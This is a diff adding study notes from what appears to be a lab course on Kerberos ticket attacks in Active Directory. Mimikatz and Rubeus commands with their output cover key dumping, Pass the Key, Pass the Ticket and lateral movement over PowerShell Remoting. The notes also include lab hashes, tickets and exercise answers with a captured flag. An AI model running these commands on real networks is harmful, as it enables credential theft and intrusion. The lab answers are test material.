@@ -2438,3 +2438,281 @@ dir *.kirbi
 
 The tickets that end with `$` correspond to the computer account, which needs a ticket to interact with the Active Directory. User tickets have the user's name, followed by an `@` that separates the service name and the domain, for example: `[randomvalue]-username@service-domain.local.kirbi`.
 
+>[!Note]
+>If you pick a ticket with the service krbtgt, it corresponds to the TGT of that account.
+#### Rubeus - Export tickets
+
+```powershell
+Rubeus.exe dump /nowrap
+---
+Action: Dump Kerberos Ticket Data (All Users)
+
+[*] Current LUID    : 0x6c680
+    ServiceName           :  krbtgt/inlanefreight.htb
+    ServiceRealm          :  inlanefreight.htb
+    UserName              :  DC01$
+    UserRealm             :  inlanefreight.htb
+    StartTime             :  7/12/2022 9:39:54 AM
+    EndTime               :  7/12/2022 7:39:54 PM
+    RenewTill             :  7/19/2022 9:39:54 AM
+    Flags                 :  name_canonicalize, pre_authent, renewable, forwarded, forwardable
+    KeyType               :  aes256_cts_hmac_sha1
+    Base64(key)           :  KWBMpM4BjenjTniwH0xw8FhvbFSf+SBVZJJcWgUKi3w=
+    Base64EncodedTicket   :  doIE1jCCBNKgAwIBBaED...
+
+  UserName                 : plaintext
+  Domain                   : HTB
+  LogonId                  : 0x6c680
+  UserSID                  : S-1-5-21-228825152-3134732153-3833540767-1107
+  AuthenticationPackage    : Kerberos
+  LogonType                : Interactive
+  LogonTime                : 7/12/2022 9:42:15 AM
+  LogonServer              : DC01
+  LogonServerDNSDomain     : inlanefreight.htb
+  UserPrincipalName        : plaintext@inlanefreight.htb
+
+    ServiceName           :  krbtgt/inlanefreight.htb
+    ServiceRealm          :  inlanefreight.htb
+    UserName              :  plaintext
+    UserRealm             :  inlanefreight.htb
+    StartTime             :  7/12/2022 9:42:15 AM
+    EndTime               :  7/12/2022 7:42:15 PM
+    RenewTill             :  7/19/2022 9:42:15 AM
+    Flags                 :  name_canonicalize, pre_authent, initial, renewable, forwardable
+    KeyType               :  aes256_cts_hmac_sha1
+    Base64(key)           :  2NN3wdC4FfpQunUUgK+MZO8f20xtXF0dbmIagWP0Uu0=
+    Base64EncodedTicket   :  doIE9jCCBPKgAwIBBaED...
+```
+
+>[!Important]
+>To collect all tickets we need to execute Mimikatz or Rubeus as an administrator.
+
+This is a common way to retrieve tickets from a computer. Another advantage of abusing Kerberos tickets is the ability to forge our own tickets. Let's see how we can do this using the `Pass the Key` aka. `OverPass the Hash` technique.
+## Pass the Key aka. OverPass the Hash
+
+The traditional `Pass the Hash` (`PtH`) technique involves reusing an NTLM password hash that doesn't touch Kerberos. The `Pass the Key` aka. `OverPass the Hash` approach converts a hash/key (rc4_hmac, aes256_cts_hmac_sha1, etc.) for a domain-joined user into a full `Ticket Granting Ticket` (`TGT`).
+
+To forge our tickets, we need to have the user's hash; we can use Mimikatz to dump all users Kerberos encryption keys using the module `sekurlsa::ekeys`. This module will enumerate all key types present for the Kerberos package.
+
+```powershell
+mimikatz.exe
+privilege::debug
+sekurlsa::ekeys
+```
+
+Now that we have access to the `AES256_HMAC` and `RC4_HMAC` keys, we can perform the OverPass the Hash aka. Pass the Key attack using `Mimikatz` and `Rubeus`.
+
+#### Mimikatz - Pass the Key aka. OverPass the Hash
+
+```powershell
+mimikatz.exe
+privilege::debug
+sekurlsa::pth /domain:inlanefreight.htb /user:plaintext /ntlm:3f74aa8f08f712f09cd5177b5c1ce50f
+```
+
+This will create a new `cmd.exe` window that we can use to request access to any service we want in the context of the target user.
+
+To forge a ticket using `Rubeus`, we can use the module `asktgt` with the username, domain, and hash which can be `/rc4`, `/aes128`, `/aes256`, or `/des`. In the following example, we use the AES-256 hash from the information we collect using Mimikatz `sekurlsa::ekeys`.
+#### Rubeus - Pass the Key aka. OverPass the Hash
+
+```powershell
+Rubeus.exe asktgt /domain:inlanefreight.htb /user:plaintext /aes256:b21c99fc068e3ab2ca789bccbef67de43791fd911c6e15ead25641a8fda3fe60 /nowrap
+```
+
+>[!Important] 
+>Mimikatz requires administrative rights to perform the Pass the Key/OverPass the Hash attacks, while Rubeus doesn't.
+
+To learn more about the difference between Mimikatz `sekurlsa::pth` and Rubeus `asktgt`, consult the Rubeus tool documentation [Example for OverPass the Hash](https://github.com/GhostPack/Rubeus#example-over-pass-the-hash).
+
+>[!Note]
+>Modern Windows domains (functional level 2008 and above) use AES encryption by default in normal Kerberos exchanges. If we use an rc4_hmac (NTLM) hash in a Kerberos exchange instead of an aes256_cts_hmac_sha1 (or aes128) key, it may be detected as an "encryption downgrade."
+## Pass the Ticket (PtT)
+
+Now that we have some Kerberos tickets, we can use them to move laterally within an environment.
+
+With `Rubeus` we performed an OverPass the Hash attack and retrieved the ticket in Base64 format. Instead, we could use the flag `/ptt` to submit the ticket (TGT or TGS) to the current logon session.
+
+#### Rubeus - Pass the Ticket
+
+```powershell
+Rubeus.exe asktgt /domain:inlanefreight.htb /user:plaintext /rc4:3f74aa8f08f712f09cd5177b5c1ce50f /ptt
+```
+
+Note that now it displays `Ticket successfully imported!`.
+
+Another way is to import the ticket into the current session using the `.kirbi` file from the disk.
+
+Let's use a ticket exported from Mimikatz and import it using Pass the Ticket.
+
+```powershell
+Rubeus.exe ptt /ticket:[0;6c680]-2-0-40e10000-plaintext@krbtgt-inlanefreight.htb.kirbi
+```
+
+We can also use the Base64 output from Rubeus or convert a .kirbi to Base64 to perform the Pass the Ticket attack. We can use PowerShell to convert a .kirbi to Base64.
+#### Convert .kirbi to Base64 Format
+
+```powershell
+[Convert]::ToBase64String([IO.File]::ReadAllBytes("[0;6c680]-2-0-40e10000-plaintext@krbtgt-inlanefreight.htb.kirbi"))
+```
+
+Using Rubeus, we can perform a Pass the Ticket providing the Base64 string instead of the file name.
+#### Pass the Ticket - Base64 Format
+
+```powershell
+Rubeus.exe ptt /ticket:doIE1jCCBNKgAwIBBaEDAgEWooID+TCCA/VhggPxMIID7aADAgEFoQkbB0hUQi5DT02iHDAaoAMCAQKhEzARGwZrcmJ0Z3QbB2h0Yi5jb22jggO7MIIDt6ADAgESoQMCAQKiggOpBIIDpY8Kcp4i71zFcWRgpx8ovymu3HmbOL4MJVCfkGIrdJEO0iPQbMRY2pzSrk/gHuER2XRLdV/...SNIP...
+```
+
+Finally, we can also perform the Pass the Ticket attack using the Mimikatz module `kerberos::ptt` and the .kirbi file that contains the ticket we want to import.
+#### Mimikatz - Pass the Ticket
+
+```powershell
+mimikatz.exe
+privilege::debug
+kerberos::ptt "C:\Users\plaintext\Desktop\Mimikatz\[0;6c680]-2-0-40e10000-plaintext@krbtgt-inlanefreight.htb.kirbi"
+```
+
+>[!Note]
+Instead of opening mimikatz.exe with cmd.exe and exiting to get the ticket into the current command prompt, we can use the Mimikatz module `misc` to launch a new command prompt window with the imported ticket using the `misc::cmd` command.
+## Pass The Ticket with PowerShell Remoting (Windows)
+
+[PowerShell Remoting](https://docs.microsoft.com/en-us/powershell/scripting/learn/remoting/running-remote-commands?view=powershell-7.2) allows us to run scripts or commands on a remote computer. Administrators often use PowerShell Remoting to manage remote computers on the network. Enabling PowerShell Remoting creates both HTTP and HTTPS listeners. The listener runs on standard port TCP/5985 for HTTP and TCP/5986 for HTTPS.
+
+To create a PowerShell Remoting session on a remote computer, you must have administrative permissions, be a member of the Remote Management Users group, or have explicit PowerShell Remoting permissions in your session configuration.
+
+Suppose we find a user account that doesn't have administrative privileges on a remote computer but is a member of the Remote Management Users group. In that case, we can use PowerShell Remoting to connect to that computer and execute commands.
+## Mimikatz - PowerShell Remoting with Pass the Ticket
+
+To use PowerShell Remoting with Pass the Ticket, we can use Mimikatz to import our ticket and then open a PowerShell console and connect to the target machine. Let's open a new `cmd.exe` and execute `mimikatz.exe`, then import the ticket we collected using `kerberos::ptt`. Once the ticket is imported into our `cmd.exe` session, we can launch a PowerShell command prompt from the same `cmd.exe` and use the command `Enter-PSSession` to connect to the target machine.
+#### Mimikatz - Pass the Ticket for lateral movement.
+
+```powershell
+mimikatz.exe
+privilege::debug
+kerberos::ptt "C:\Users\Administrator.WIN01\Desktop\[0;1812a]-2-0-40e10000-john@krbtgt-INLANEFREIGHT.HTB.kirbi"
+exit
+
+powershell
+```
+## Rubeus - PowerShell Remoting with Pass the Ticket
+
+Rubeus has the option `createnetonly`, which creates a sacrificial process/logon session ([Logon type 9](https://eventlogxp.com/blog/logon-type-what-does-it-mean/)). The process is hidden by default, but we can specify the flag `/show` to display the process, and the result is the equivalent of `runas /netonly`. This prevents the erasure of existing TGTs for the current logon session.
+#### Create a sacrificial process with Rubeus
+
+```powershell
+Rubeus.exe createnetonly /program:"C:\Windows\System32\cmd.exe" /show
+```
+The above command will open a new cmd window. From that window, we can execute Rubeus to request a new TGT with the option `/ptt` to import the ticket into our current session and connect to the DC using PowerShell Remoting.
+#### Rubeus - Pass the Ticket for lateral movement
+
+```powershell
+Rubeus.exe asktgt /user:john /domain:inlanefreight.htb /aes256:9279bcbd40db957a0ed0d3856b2e67f9bb58e6dc7fc07207d0763ce2713f11dc /ptt
+```
+## Exercise
+### Connect to the target machine using RDP and the provided creds. Export all tickets present on the computer. How many users TGT did you collect?
+
+```powershell
+
+--- 
+Mode                LastWriteTime         Length Name
+----                -------------         ------ ----
+d-----        9/23/2022   1:51 PM                Invoke-TheHash
+-a----        10/7/2022   9:43 AM        8230912 chisel.exe
+-a----        9/22/2022   1:12 PM        1355264 mimikatz.exe
+-a----        9/22/2022   1:13 PM          45272 nc.exe
+-a----        9/22/2022   1:14 PM         440832 Rubeus.exe
+-a----       10/11/2026   8:53 PM           1703 [0;3e4]-0-0-40a50000-MS01$@DNS-dc01.inlanefreight.htb.kirbi
+-a----       10/11/2026   8:53 PM           1705 [0;3e4]-0-1-40a50000-MS01$@cifs-DC01.inlanefreight.htb.kirbi
+-a----       10/11/2026   8:53 PM           1739 [0;3e4]-0-2-40a50000-MS01$@GC-DC01.inlanefreight.htb.kirbi
+-a----       10/11/2026   8:53 PM           1743 [0;3e4]-0-3-40a50000-MS01$@ldap-dc01.inlanefreight.htb.kirbi
+-a----       10/11/2026   8:53 PM           1633 [0;3e4]-2-0-60a10000-MS01$@krbtgt-INLANEFREIGHT.HTB.kirbi
+-a----       10/11/2026   8:53 PM           1633 [0;3e4]-2-1-40e10000-MS01$@krbtgt-INLANEFREIGHT.HTB.kirbi
+-a----       10/11/2026   8:53 PM           1743 [0;3e7]-0-0-40a50000-MS01$@cifs-DC01.inlanefreight.htb.kirbi
+-a----       10/11/2026   8:53 PM           1659 [0;3e7]-0-1-40a50000.kirbi
+-a----       10/11/2026   8:53 PM           1705 [0;3e7]-0-2-40a50000-MS01$@LDAP-DC01.inlanefreight.htb.kirbi
+-a----       10/11/2026   8:53 PM           1743 [0;3e7]-0-3-40a50000-MS01$@LDAP-DC01.inlanefreight.htb.kirbi
+-a----       10/11/2026   8:53 PM           1633 [0;3e7]-2-0-60a10000-MS01$@krbtgt-INLANEFREIGHT.HTB.kirbi
+-a----       10/11/2026   8:53 PM           1633 [0;3e7]-2-1-40e10000-MS01$@krbtgt-INLANEFREIGHT.HTB.kirbi
+-a----       10/11/2026   8:53 PM           1641 [0;54e08]-2-0-40e10000-julio@krbtgt-INLANEFREIGHT.HTB.kirbi
+-a----       10/11/2026   8:53 PM           1623 [0;55810]-2-0-40e10000-john@krbtgt-INLANEFREIGHT.HTB.kirbi
+-a----       10/11/2026   8:53 PM           1633 [0;56130]-2-0-40e10000-david@krbtgt-INLANEFREIGHT.HTB.kirbi
+```
+
+3
+### Use john's TGT to perform a Pass the Ticket attack and retrieve the flag from the shared folder \\DC01.inlanefreight.htb\john
+
+```powershell
+Rubeus.exe dump /nowrap
+
+[*] Current LUID    : 0xf4029
+
+  UserName                 : john
+  Domain                   : INLANEFREIGHT
+  LogonId                  : 0x55810
+  UserSID                  : S-1-5-21-3325992272-2815718403-617452758-1108
+  AuthenticationPackage    : Kerberos
+  LogonType                : Service
+  LogonTime                : 10/11/2026 8:03:06 PM
+  LogonServer              : DC01
+  LogonServerDNSDomain     : INLANEFREIGHT.HTB
+  UserPrincipalName        : john@inlanefreight.htb
+
+
+    ServiceName              :  krbtgt/INLANEFREIGHT.HTB
+    ServiceRealm             :  INLANEFREIGHT.HTB
+    UserName                 :  john
+    UserRealm                :  INLANEFREIGHT.HTB
+    StartTime                :  10/11/2026 8:03:06 PM
+    EndTime                  :  10/12/2026 6:03:06 AM
+    RenewTill                :  10/18/2026 8:03:06 PM
+    Flags                    :  name_canonicalize, pre_authent, initial, renewable, forwardable
+    KeyType                  :  aes256_cts_hmac_sha1
+    Base64(key)              :  wsfl/8LWpXdrAw4YKEZQ8hQJRbd+QpmOj5o3INBheI4=
+    Base64EncodedTicket   :
+
+      doIFqDCCBaSgAwIBBaEDAgEWooIEojCCBJ5hggSaMIIElqADAgEFoRMbEUlOTEFORUZSRUlHSFQuSFRCoiYwJKADAgECoR0wGxsGa3JidGd0GxFJTkxBTkVGUkVJR0hULkhUQqOCBFAwggRMoAMCARKhAwIBAqKCBD4EggQ6B28lHqmMRK89atrJDzXLow04I4t7O+tHN0dzL5h1f8uwxAEISe9BytuL5zcTJfVHl9ttwI7naUvrvx+d0jaxa6oP25yLjC/1Bgd1ES+2AOJa6KdRSaQ5rMWTX8m5a2LO7Cb2hs3yB5lO4CPCL2ZhYwZPQysig6GIX0oEGaOagLvFH+rh6SzazZM63MH1PHAjcueXy1y2MgtkrxnRFoV6a/1adTSphBWf1nmzbiXYnlFXOyu58v0y2CM0fYqHaDs7A7nMeIP0m4hGktm/gPbwlIWekcE3br4apuB2N9TQWBIIZ/M0uLsMZMSEbMJnu/eUapvQ2eFwro/oseQtvvAKMvS/hmXLySOvOzGPFj7+puv/pI344xJLndYa1aOBQTfryhB0OZhH5ANbGL6aDmVJ8Ca3t3EsvK8Mmy8ehh9ZFQWlhYEvg0cUP6HH17c2Gam5eT000WdEEuCwSORVXJxth0Z0u4gLvdNY86NS+OlmaW2xSMLTOy/Y8jXOtBeI0oQygCHO3+5eijw6lCoEhx6dnIEWuPeZD8Dko5VPiZ/fpdjOKhPx2f29itPsQexydq8HkpLti8d5Sxp/j0sOmgMVkUIoWs8vKN4vTgneG+ChxoebT0ogtAHIm8wwA7iSpfJrdPvRHbXu3DLWaAvPYlbzYZqs86JFZvQr0XbwFP7g6ti4ojjaoQ/HphCWi/eDSf0SV+IGYOmAlFEI2dqvMni0u+YEpQ3q3yynzaHIco9Rly8lm6sZqiWBZzCNIMQq+a5m4O3qV11LbXZBuITGLRAaVLP0uzw6qpD6k04WHUaHQCkyo4lnI162UogSFcQHBsRItDf45QoklzQTj42346QEe82ex8fJyYBMsSx4arGajfUDQUApsaX3HUtm1KB4NmCW8iokygoq05F8vhXlp5Z78yab0C1OWpW2vHRg4jQjUk8zoa33Ia5HyvYzryRLaUzd9U3M7TC86iCWyj1mxpZ17DuzlHM8X4yaaZWp6fq2KgCb0WTeIYEp3AvrBIBTmYDrKEN4/rWADR4LPY9dD1CS8yBAjqc+Ubss2dbP44FEz7SMYdpvZYqQCd/9B00FKz58LmzFWwtn+xf7Dl+FECMWpYSGUpUpJReDMrFbEb+UT40YXXPuL3NaOC69nLPBm1V4qugMBUFsl8H7FHvVomQZ+LcffYOtgIQ9SAbfMqM8uak7qBbQN8H+mSovlGYKBGCwEB7lrd77dcDDyHknrvSXHmLxcBKKsut/MdCuxYc/Fm4sWpUMM3JmnQI0zwovt6NmhOBK9LmJ6B6yGcbG6ukROfHZGwgu+cMmBJlOO2dGfI1H3V1MrUdYb3RyPbGLbcglvadgPwV3FcuHCqUtWdvBoml5yhp/qHISqGfAkx1sqbG9PgZJMI1iPrOrfp4OagQUKtKBk/ylzCZ3ADKAYRGIYZPGGWVRGnBY2gKjgfEwge6gAwIBAKKB5gSB432B4DCB3aCB2jCB1zCB1KArMCmgAwIBEqEiBCDCx+X/wtald2sDDhgoRlDyFAlFt35CmY6Pmjcg0GF4jqETGxFJTkxBTkVGUkVJR0hULkhUQqIRMA+gAwIBAaEIMAYbBGpvaG6jBwMFAEDhAAClERgPMjAyNjEwMTIwMTAzMDZaphEYDzIwMjYxMDEyMTEwMzA2Wqc
+```
+
+```powershell
+sekurlsa::ekeys
+---
+Authentication Id : 0 ; 350224 (00000000:00055810)
+Session           : Service from 0
+User Name         : john
+Domain            : INLANEFREIGHT
+Logon Server      : DC01
+Logon Time        : 10/11/2026 8:03:06 PM
+SID               : S-1-5-21-3325992272-2815718403-617452758-1108
+
+         * Username : john
+         * Domain   : INLANEFREIGHT.HTB
+         * Password : (null)
+         * Key List :
+           aes256_hmac       9279bcbd40db957a0ed0d3856b2e67f9bb58e6dc7fc07207d0763ce2713f11dc
+           rc4_hmac_nt       c4b0e1b10c7ce2c4723b4e2407ef81a2
+           rc4_hmac_old      c4b0e1b10c7ce2c4723b4e2407ef81a2
+           rc4_md4           c4b0e1b10c7ce2c4723b4e2407ef81a2
+           rc4_hmac_nt_exp   c4b0e1b10c7ce2c4723b4e2407ef81a2
+           rc4_hmac_old_exp  c4b0e1b10c7ce2c4723b4e2407ef81a2
+```
+
+```powershell
+sekurlsa::pth /domain:inlanefreight.htb /user:plaintext /ntlm:c4b0e1b10c7ce2c4723b4e2407ef81a2
+
+smbclient '//DC01.inlanefreight.htb/john' -U john --pw-nt-hash c4b0e1b10c7ce2c4723b4e2407ef81a2
+```
+
+```powershell
+kerberos::ptt "[0;775fa]-2-0-40e10000-john@krbtgt-INLANEFREIGHT.HTB.kirbi"
+exit
+
+dir \\DC01.inlanefreight.htb\john
+```
+### Use john's TGT to perform a Pass the Ticket attack and connect to the DC01 using PowerShell Remoting. Read the flag from C:\john\john.txt
+
+```powershell
+Enter-PSSession -ComputerName DC01 # We use the stolen ticket
+whoami
+
+type C:/john/john.txt
+P4$$_th3_Tick3T_PSR
+```
